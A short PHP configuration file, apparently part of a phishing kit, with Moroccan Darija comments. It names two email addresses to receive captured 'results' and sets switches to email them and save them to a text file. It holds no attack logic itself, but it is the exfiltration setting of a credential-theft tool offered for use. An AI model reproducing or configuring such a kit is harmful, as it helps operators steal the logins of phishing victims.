<?php
error_reporting(0);
$Your_Email = "zoloxfree@gmail.com,jhoneluc@protonmail.com";  // dir email dyalk hena 
$Send_Log=1;  // Send to email ila beryti tesyft ruslta boite mail dyal dir value 1 ola mabrtihach 0
$Save_Log=1;  // Save to ruslt txt ila beryti dire save rslt txt dire 1 ola mabritihach dire 0
// kolchi howa hadak 3la barati lahe 
?>